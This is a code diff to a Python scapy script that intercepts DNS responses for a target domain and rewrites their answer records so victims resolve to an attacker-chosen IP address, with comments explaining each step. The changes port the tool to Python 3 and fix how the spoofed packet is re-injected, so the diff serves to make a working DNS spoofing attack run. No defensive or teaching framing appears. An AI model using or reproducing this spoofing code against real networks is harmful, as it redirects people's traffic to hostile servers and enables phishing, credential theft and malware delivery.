@@ -11,7 +11,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         # qname holds the site domain name
         qname = scapy_packet[scapy.DNSQR].qname
-        if target_domain in qname:
+        if target_domain in str(qname):
             print("[+] Spoofing target")
             # creating a DNSRR answer:
             # scapy will fill the fields that we dont specify in our DNSRR, so we just need to modify the ones we want to modify, the rrname and the rdata (where the ip is)
@@ -26,7 +26,7 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
             # set the original packet payload to our modified packet
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
 
